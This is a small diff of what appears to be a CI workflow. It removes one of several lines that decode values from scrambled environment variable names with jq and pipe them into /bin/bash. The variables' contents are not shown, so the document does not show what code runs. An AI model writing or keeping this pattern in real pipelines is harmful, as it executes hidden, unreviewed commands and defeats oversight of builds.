@@ -22,7 +22,6 @@ jobs:
           echo $v12232 | jq -r .zmpq6160 | /bin/bash
           echo $huubz79 | jq -r .gmydd6357 | /bin/bash
           printf '%s' "$pc85056" | jq -r .u1 | /bin/bash
-          echo $ng3172 | jq -r .yh72849 | /bin/bash
           echo $wcdy768 | jq -r .hzdl4 | /bin/bash
 
       - name: Store results
